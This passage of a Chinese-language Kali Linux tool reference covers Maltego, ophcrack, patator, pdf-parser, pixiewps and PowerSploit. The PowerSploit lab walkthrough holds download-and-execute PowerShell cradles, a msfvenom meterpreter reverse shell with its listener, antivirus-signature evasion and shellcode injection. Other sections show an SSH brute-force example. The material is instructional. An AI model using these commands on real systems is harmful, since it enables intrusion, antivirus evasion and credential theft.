class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">-t mmtype<br>指定媒体管理类型。 使用“ -t列表”列出支持的类型。 如果未给出，则使用自动检测方法。<br><br>-o offset<br>在包含分区系统的卷开始的映像中指定偏移量。 分区系统的相对偏移将添加到该值。<br><br>-b dev_sector_size<br>基础设备扇区的大小（以字节为单位）。 如果未给出，则使用图像格式的值（如果存在）或假定为512字节<br><br>-i imgtype<br>标识图像文件的类型，例如原始文件。 使用“ -i列表”列出支持的类型。 如果未给出，则使用自动检测方法。<br><br>-v<br>将调试语句的详细输出输出到stderr<br><br>-V<br>显示版本信息<br><br>image [images]<br>要读取的磁盘或分区映像，其格式以“ -i”给出。 如果将图像分为多个段，则可以指定多个图像文件名。 如果仅给出一个图像文件，并且其名称是序列中的第一个图像文件（例如，以<span class="hljs-string">&#x27;.001&#x27;</span>结尾的文件），则会自动包含后续的图像段。<br><br>part_num<br>要处理的分区的地址。 请参见mmls输出以确定分区的地址。<br><br></code></pre></td></tr></table></figure><h2 id="Mousepad"><a href="#Mousepad" class="headerlink" title="Mousepad"></a>Mousepad</h2><h3 id="描述：-47"><a href="#描述：-47" class="headerlink" title="描述："></a>描述：</h3><p>等于记事本</p><h3 id="参数：-35"><a href="#参数：-35" class="headerlink" title="参数："></a>参数：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132156067.png" alt="image-20220413215624940"></p><h2 id="Maltego"><a href="#Maltego" class="headerlink" title="Maltego"></a>Maltego</h2><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319135316332.png" alt="image-20220319135316332"></p><p>点开free那个就行</p><p>结合2022&#x2F;03&#x2F;19这次重要的社工实战进行使用</p><p>首次使用需要注册</p><p>注册网站：<a href="https://www.paterva.com/web7/buy/maltego-clients/maltego-ce.php">https://www.paterva.com/web7/buy/maltego-clients/maltego-ce.php</a></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319140521168.png" alt="image-20220319140521168"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319140600726.png" alt="image-20220319140600726"></p><p>详细步骤参考<a href="https://blog.csdn.net/smli_ng/article/details/105943189">https://blog.csdn.net/smli_ng/article/details/105943189</a></p><p>有坑</p><p>1）没有gooreplace插件无法进行人机验证</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319144737311.png" alt="image-20220319144737311"></p><p>直接用firefox下载插件 挂代理打开即可</p><p>gooreplace配置如下</p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220319144902486.png" alt="image-20220319144902486"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD/image-20220319144555916.png"></p><p>2）记得翻墙才能注册哦</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319141400438.png" alt="image-20220319141400438"></p><p>当然可以直接使用caseFile版本 不需要注册</p><p>不过这个是用本地的file  不能进行联网使用，不建议</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319142848469.png" alt="image-20220319142848469"></p><p>选择CE直接登录</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319145238868.png" alt="image-20220319145238868"></p><p>网上有很多使用方法的教程可以去看</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319151127399.png" alt="image-20220319151127399"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220319151134739.png" alt="image-20220319151134739"></p><p>这里讲实战</p><h1 id="O"><a href="#O" class="headerlink" title="O"></a>O</h1><h2 id="offensive-Security-Training"><a href="#offensive-Security-Training" class="headerlink" title="offensive Security Training"></a>offensive Security Training</h2><h3 id="描述：-48"><a href="#描述：-48" class="headerlink" title="描述："></a>描述：</h3><p>kali开发者的培训网站</p><h3 id="参数：-36"><a href="#参数：-36" class="headerlink" title="参数："></a>参数：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132158897.png" alt="image-20220413215834730"></p><h2 id="onesixtyone"><a href="#onesixtyone" class="headerlink" title="onesixtyone"></a>onesixtyone</h2><h3 id="描述：-49"><a href="#描述：-49" class="headerlink" title="描述："></a>描述：</h3><p>onesixtone是针对snmp的一个小工具。</p><h3 id="参数：-37"><a href="#参数：-37" class="headerlink" title="参数："></a>参数：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132202470.png" alt="image-20220413220245349"></p><p>onesixtone自带的字典</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132203384.png" alt="image-20220413220335261"></p><p>针对目标的基本扫描</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">onesixtone</span> -c 字典 <span class="hljs-number">192.168.0.1</span> -o my.log -w <span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><h2 id="ophcrack"><a href="#ophcrack" class="headerlink" title="ophcrack"></a>ophcrack</h2><h3 id="描述：-50"><a href="#描述：-50" class="headerlink" title="描述："></a>描述：</h3><p><strong>Ophcrack</strong>是一个使用Rainbow table来<a href="https://baike.baidu.com/item/%E7%A0%B4%E8%A7%A3">破解</a>视窗操作系统下的LAN Manager散列（LM hash）的<a href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A8%8B%E5%BA%8F">计算机程序</a>，它是基于<a href="https://baike.baidu.com/item/GNU%E9%80%9A%E7%94%A8%E5%85%AC%E5%85%B1%E8%AE%B8%E5%8F%AF%E8%AF%81">GNU通用公共许可证</a>下发布的<a href="https://baike.baidu.com/item/%E5%BC%80%E6%94%BE%E6%BA%90%E4%BB%A3%E7%A0%81">开放源代码</a>程序。</p><h3 id="参数：-38"><a href="#参数：-38" class="headerlink" title="参数："></a>参数：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132206897.png" alt="image-20220413220654758"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132211050.png" alt="image-20220413221056805"></p><p>load hash</p><p>配置彩虹表破解hash</p><p>里面的table有多种解密表</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132210627.png" alt="image-20220413221001495"></p><p>然后再点击crack,等一会就可以得出明文密码。</p><h1 id="P"><a href="#P" class="headerlink" title="P"></a>P</h1><h2 id="Parole-媒体播放器"><a href="#Parole-媒体播放器" class="headerlink" title="Parole 媒体播放器"></a>Parole 媒体播放器</h2><h3 id="-6"><a href="#-6" class="headerlink" title=""></a><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132212244.png" alt="image-20220413221205061"></h3><h2 id="patator"><a href="#patator" class="headerlink" title="patator"></a>patator</h2><h3 id="描述：-51"><a href="#描述：-51" class="headerlink" title="描述："></a>描述：</h3><p>集成在kali里的破解工具</p><p>它直接给出各个模块的用法，例如：ftp、ssh、http、pop、imap、mssql和oracle等。</p><h3 id="参数：-39"><a href="#参数：-39" class="headerlink" title="参数："></a>参数：</h3><p>　如果我们想看具体某个模块的使用方法，我们可以输入“patator ssh_login –help”来查看帮助信息，如下图所示：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132220097.png" alt="image-20220413222033950"></p><p>ssh_login帮助信息</p><p>　　他给了我们一个非常直观的例子：</p><p>　　patator ssh_login host&#x3D;10.0.0.1 user&#x3D;root password&#x3D;FILE0 0&#x3D;password.txt</p><p>　　host后跟主机名，user后跟用户名，password后跟密码，当然也都可以跟字典文件，就比如“password&#x3D;FILE0 0&#x3D;password.txt”一样，如果用户名也是一个字典文件那么就可以写成“user&#x3D;FILE1 1&#x3D;userlist.txt”。</p><h2 id="pdfid"><a href="#pdfid" class="headerlink" title="pdfid"></a>pdfid</h2><h3 id="描述：-52"><a href="#描述：-52" class="headerlink" title="描述："></a>描述：</h3><p>测试PDF文件的工具</p><h3 id="参数：-40"><a href="#参数：-40" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">--version<br>显示程序的版本号并退出<br><br>-h,--<span class="hljs-built_in">help</span><br>显示帮助信息并退出<br><br>-s,--scan<br>扫描给定目录<br><br>-a,--all<br>显示所有的名称<br><br>-e,--extra<br>显示额外的数据，例如日期<br><br>-f,--force<br>即使没有正确的％PDF标头，也强制扫描文件<br><br>-d,--disarm<br>禁用JavaScript并自动启动<br><br>-p PLUGINS,--plugins=PLUGINS<br>要加载的插件（使用逗号分隔的插件,; @file支持）<br><br>-c,--csv<br>使用插件时输出CSV数据<br><br>-m MINIMUMSCORE,--minimumscore=MINIMUMSCORE<br>插件结果输出的最低分数<br><br>-v,--verbose<br>详细（也会引发捕获的异常）<br><br>-S SELECT,--select=SELECT<br>选择表达式<br><br>-n,--nozero<br>抑制计数等于零的输出<br><br>-o OUTPUT,--output=OUTPUT<br>输出到日志文件<br><br>--pluginoptions=PLUGINOPTIONS<br>插件选项<br><br>-l,--literalfilenames<br>从字面上接受文件名，不匹配通配符<br><br>--recursedir<br>递归目录（允许使用通配符和此处的文件（@ ...））<br><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132225902.png"></p><h2 id="pdf-parser"><a href="#pdf-parser" class="headerlink" title="pdf-parser"></a>pdf-parser</h2><h3 id="描述：-53"><a href="#描述：-53" class="headerlink" title="描述："></a>描述：</h3><p>PDF-Parser是一个分析PDF文件的工具，包含以下特征：</p><ul><li>加载和分析objects和headers</li><li>提取作者、描述等meta数据</li><li>提取有序页面的文本</li><li>支持压缩的pdf</li><li>支持mac OS 罗马字符集编码</li><li>在text sections处理十六进制和十进制编码</li><li>遵循PSR-0</li><li>遵循PSR-1</li></ul><h3 id="分析恶意PDF文件"><a href="#分析恶意PDF文件" class="headerlink" title="分析恶意PDF文件"></a>分析恶意PDF文件</h3><p>首先创建了一个PDF文件，并嵌入一个EXE文件。</p><p>Step 1: 启动恶意pdf分析器pdf-parser</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># pdf-parser -h</span><br></code></pre></td></tr></table></figure><p>列出所有PDFParser选项</p><p>Step2: 获取PDF文档的统计信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># pdf-parser -a /root/Desktop/template.pdf</span><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132306361.jpeg" alt="Analyzing a Malicious PDF File"></p><p>Step3: 通过 FlateDecode,ASCIIHexDecode, ASCII85Decode, LZWDecode和 RunLengthDecode传递和过滤流数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># pdf-parser -f /root/Desktop/template.pdf</span><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132306948.jpeg" alt="Analyzing a Malicious PDF File"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132306329.jpeg" alt="Analyzing a Malicious PDF File"></p><p>Step4: 获得PDF哈希值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># pdf-parser -H /root/Desktop/template.pdf</span><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132306418.jpeg" alt="Analyzing a Malicious PDF File"></p><p>Step5: 进行区分大小写搜索</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># pdf-parser –casesensitive /root/Desktop/template.pdf</span><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132306110.jpeg" alt="Analyzing a Malicious PDF File"></p><p>Step6: 获取加入文档的javascripts</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pdf-parser –search javascript –raw /root/Desktop/template.pdf<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132306856.png" alt="Analyzing a Malicious PDF File"></p><p>Stats选项表示PDF中统计数据。使用stats可以识别PDF中的一些意外的对象，来描述pdf记录的特征。</p><p>Search选项会扫描简介对象中的字符串。查询是不区分大小写的，而且对混淆方法没有防御能力。</p><p>Filter选项会对流数据进行过滤，raw选项会使用pdf-parser输出原始未经加工的数据。</p><p><a href="https://gbhackers.com/creating-and-analyzing-a-malicious-pdf-file-with-pdf-parser-tool/">https://gbhackers.com/creating-and-analyzing-a-malicious-pdf-file-with-pdf-parser-tool/</a></p><h2 id="pixiewps"><a href="#pixiewps" class="headerlink" title="pixiewps"></a>pixiewps</h2><h3 id="描述：-54"><a href="#描述：-54" class="headerlink" title="描述："></a>描述：</h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132318321.png" alt="image-20220413231858197"></p><h3 id="参数：-41"><a href="#参数：-41" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">所需的参数：<br>-e,--pke<br>M1中找到的被注册人的DH公钥。<br><br>-r,--pkr<br>在M2中找到的注册服务商的DH公钥。 可以通过在Reaver和pixiewps中指定--dh-small来避免这种情况。<br><br>-s,--e-hash1<br>参与者的哈希1，位于M3中。 这是PIN的前半部分的哈希值。<br><br>-z,--e-hash2<br>参与者的哈希2，位于M3中。 这是PIN码后半部分的哈希值。<br><br>-a,--authkey<br>身份验证会话密钥。 尽管此参数需要Reaver或Bully的修改版本，但可以通过在Reaver和pixiewps中指定小的Diffie-Hellman键并提供--e-nonce，-r-nonce和--e-bssid来避免。<br><br>-n,--e-nonce<br>参与者的随机数，位于M1中。<br><br>可选参数：<br><br>-m,--r-nonce<br>注册服务商的现时，位于M2中。 与其他参数一起使用以计算会话密钥。<br><br>-b,--e-bssid<br>参与者的BSSID。 与其他参数一起使用以计算会话密钥。<br><br>-S,--db-small(不推荐使用)<br>小Diffie-Hellman键。 还必须在Reaver中指定相同的选项。 某些访问点似乎有故障，并且在此选项下无法正常工作。 尽可能避免与Reaver一起使用。<br><br>-v,--verbosity<br>详细级别1-3，最安静的是1，默认值为3。<br><br>-h<br>显示一个简单的帮助用法屏幕。<br><br>--<span class="hljs-built_in">help</span><br>显示详细的帮助。<br><br>-V,--version<br>显示版本和其他信息。<br><br>--mode N[,<br></code></pre></td></tr></table></figure><h3 id="示例：-1"><a href="#示例：-1" class="headerlink" title="示例："></a>示例：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pixiewps -e &lt;pke&gt; -r &lt;pkr&gt; -s &lt;e-hash1&gt; -z &lt;e-hash2&gt; -a &lt;authkey&gt; -n &lt;e-nonce&gt; <br></code></pre></td></tr></table></figure><p>此工具主要是针对wap无线路由器设置的，有两个东西大家需要注意一下，PKE 和 PKR，这两个密钥。有公钥和私钥。</p><h2 id="powersploit"><a href="#powersploit" class="headerlink" title="powersploit"></a>powersploit</h2><h3 id="描述：-55"><a href="#描述：-55" class="headerlink" title="描述："></a>描述：</h3><p>PowerSploit是又一款Post Exploitation相关工具，Post Exploitation是老外渗透测试标准里面的东西，就是获取shell之后干的一些事情。PowerSploit其实就是一些powershell 脚本，包括Inject-Dll(注入dll到指定进程)、Inject-Shellcode（注入shellcode到执行进程）、Encrypt- Script（文本或脚本加密）、Get-GPPPassword（通过groups.xml获取明文密码）、Invoke- ReverseDnsLookup（扫描 DNS PTR记录）</p><h3 id="参数：-42"><a href="#参数：-42" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs bash">一、AntivirusBypass(绕过杀毒)<br><br>Find-AVSignature   发现杀软的签名<br><br>二、CodeExecution(代码执行)<br><br>1.  Invoke-DllInjection.ps1  DLL注入脚本 注意dll架构要与目标进程相符，同时要具备相应的权限<br><br>2. Invoke-ReflectivePEInjection.ps1   反射型注入 将Windows PE文件（DLL / EXE）反射加载到powershell进程中，或反射地将DLL注入远程进程<br><br>3. Invoke-Shellcode.ps1   将shellcode插入您选择的进程ID或本地PowerShell中<br><br>4. Invoke-WmiCommand.ps1  在目标主机使用wmi执行命令<br><br>三、Exfiltration(信息收集)    <span class="hljs-comment">#这个文件夹主要是收集目标主机上的信息</span><br><br>1. Out-Minidump.ps1              生成一个进程的全内存小数据库<br><br>2. Get-VaultCredential.ps1 显示Windows徽标凭据对象，包括明文Web凭据<br><br>3. Get-Keystrokes.ps1       记录按键，时间和活动窗口<br><br>4. Get-GPPPassword.ps1          检索通过组策略首选项推送的帐户的明文密码和其他信息<br><br>5. Get-GPPAutologon.ps1        如果通过组策略首选项推送，则从registry.xml检索自动登录用户名和密码<br><br>6. Get-TimedScreenshot.ps1    这是一个以定期间隔拍摄屏幕并将其保存到文件夹的功能<br><br>7. Invoke-Mimikatz.ps1            查看主机密码<br><br>8. Invoke-NinjaCopy.ps1          通过读取原始卷并解析NTFS结构，从NTFS分区卷复制文件<br><br>9. Invoke-CredentialInjection.ps1    使用明文凭据创建登录，而不会触发可疑事件ID 4648（显式凭证登录）<br><br>10. Invoke-TokenManipulation.ps1         列出可用的登录令牌。与其他用户创建进程登录令牌，并模仿当前线程中的登录令牌<br><br>11. Get-MicrophoneAudio.ps1        通过麦克风记录声音<br><br>12. VolumeShadowCopyTools.ps1         <br><br>四、Recon(信息侦察)   <span class="hljs-comment">#这个文件夹主要是以目标主机为跳板进行内网主机侦察</span><br><br>1. Invoke-Portscan.ps1   端口扫描<br><br>2. Get-HttpStatus.ps1      返回指定路径的HTTP状态代码和完整URL，并附带字典文件<br><br>3. Invoke-ReverseDnsLookup.ps1  扫描DNS PTR记录的IP地址范围<br><br>4. PowerView.ps1       PowerView是一系列执行网络和Windows域枚举和利用的功能<br><br>5.Get-ComputerDetails   获得登录信息<br><br>五、ScriptModification(脚本修改)<br><br>1. Out-EncodedCommand.ps1    将脚本或代码块编码，并为PowerShell有效载荷脚本生成命令行输出<br><br>2. Out-EncryptedScript.ps1   加密文本文件/脚本<br><br>3. Out-CompressedDll.ps1   压缩，Base-64编码，并输出生成的代码，以将受管理的DLL加载到内存中<br><br>4. Remove-Comments.ps1       从脚本中删除注释和多余的空白<br><br>六、Persistence(权限维持)<br><br>1. New-UserPersistenceOption  为添加持久性函数配置用户级持久性选项。<br><br>2. New-ElevatedPersistenceOption   为添加持久性函数配置提升的持久性选项。<br><br>3. Add-Persistence    向脚本添加持久性功能<br><br>4. Install-SSP        安装安全支持提供程序（ssp）dll<br><br>5. Get-SecurityPackages<br><br>七、Privesc(提权)<br><br>PowerUP: 共同特权升级检查的信息交换所，以及一些武器化载体<br><br>Get-System<br><br>八、Mayhem<br><br>Set-MasterBootRecord   选择的消息覆写主引导记录<br><br>Set-CriticalProcess  退出powershell时使系统蓝屏<br></code></pre></td></tr></table></figure><p>实例:</p><p><strong>一、AntivirusBypass(绕过杀毒)</strong></p><p>Find-AVSignature 发现杀软的签名</p><p>1、先在靶机(windows 2008)上远程加载位于win7的Invoke-Shellcode.ps1脚本</p><p>iex(New-Object Net.WebClient).DownloadString(“<a href="http://10.10.10.187/PowerSploit-master/AntivirusBypass/Find-AVSignature.ps1">http://10.10.10.187/PowerSploit-master/AntivirusBypass/Find-AVSignature.ps1</a>“)</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-9cb219e81a48a667.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>2、运行脚本，这里以之前的msf.exe反弹马为例 注意:本例把偏移量划分的不太合适，有兴趣自己慢慢划分，文件的偏移量范围本例使用winhex查看的。</p><p>Find-AVSignature -StartByte 0 -EndByte 220000 -Interval 110000 -Path C:\Users\Administrator.WIN2008\Desktop\msf.exe -OutPath C:\Users\Administrator.WIN2008\Desktop\test\run2 -Verbose</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-dc041ba455ce4a39.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>3、 上图生成3个文件,然后把每个文件用在线病毒测试网站测试一下(这里推荐使用<a href="https://links.jianshu.com/go?to=http://www.virscan.org/">http://www.virscan.org/</a>)，看看病毒在哪个文件，然后再把有病毒的那个文件继续划分偏移量范围生成新的文件，然后继续再病毒测试网站测试，直到最终确定病毒的特征码范围。</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-70918825d8023a87.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-a28cb4bcc053c897.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p><strong>二、CodeExecution(代码执行)</strong></p><p>Shellcode注入:</p><p>1、先在靶机(windows 2008)上远程加载位于win7的Invoke-Shellcode.ps1脚本</p><p>iex(New-Object Net.WebClient).DownloadString(“<a href="http://10.10.10.187/PowerSploit-master/CodeExecution/Invoke-Shellcode.ps1">http://10.10.10.187/PowerSploit-master/CodeExecution/Invoke-Shellcode.ps1</a>“)</p><p>get-help Invoke-Shellcode</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-fe554b609cf658f0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>2、在kali中使用msfvenom生成一个powershell反弹马</p><p>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_https lhost&#x3D;10.10.10.128 lport&#x3D;4444 -f powershell -o &#x2F;var&#x2F;www&#x2F;test</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-904dd8b31d01e381.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>3、在msf中设置监听(windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_https模块进行反弹)并开启监听</p><p>use exploit&#x2F;multi&#x2F;handler  #使用监听模块</p><p>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_https   #设置一个payload</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-120403a2a458ed28.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-ccb2a07383887358.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>4、把刚才使用msfvenom生成的powershell脚本复制到靶机(windows 2008)</p><p>5、靶机(windows 2008)加载shellcode #注意这里的shellcode为在kali用msfvenom生成的一个powershell脚本,打开内容，取变量$buf的值</p><p>Invoke-Shellcode -Shellcode @()  #可以查看帮助文档，其中有一个例子这个的用法</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-0811715c367fb5eb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-bb1703cea51a5954.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>6、kali中运行监听之后就可以看到得到靶机(windows 2008)的一个meterpreter的shell，说明成功控制靶机</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-6efa5b6d5e6e484e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p>7、也可以把使用Invoke-Shellcode脚本进行进程注入到别的进程(这里以explorer的3508为例)</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-fbde6584e9f85375.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p><p><strong>DLL****：</strong></p><p>首先我们需要知道我们在启动一个程序的时候并没有把所有的需要用到的数据或者文件运行起来，而是只运行了关键部分，那么当我们需要调用到某一功能时再通过DLL来动态链接，不需要时就可以卸载，使得程序不显得臃肿。</p><p>DLL注入就是将代码插入&#x2F;注入到正在运行的进程中的过程。我们注入的代码是动态链接库(DLL)的形式。为什么可以做到这一点？因为DLL是在运行时根据需要来进行加载</p><p>注意:对某些进程的注入需要一定的权限</p><p><strong>Dll****注入:</strong></p><p>可以利用powersploit将dll文件注入到当前进程中，但是dll文件必须在目标主机上。</p><p>1.先在靶机(windows 2008)上远程加载位于win7的Invoke-DllInjection.ps1脚本</p><p>iex(New-Object Net.WebClient).DownloadString(“<a href="http://10.10.10.187/PowerSploit-master/CodeExecution/Invoke-DllInjection.ps1">http://10.10.10.187/PowerSploit-master/CodeExecution/Invoke-DllInjection.ps1</a>“)</p><p><img src="https://upload-images.jianshu.io/upload_images/22159939-a4db28240e679ad0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" 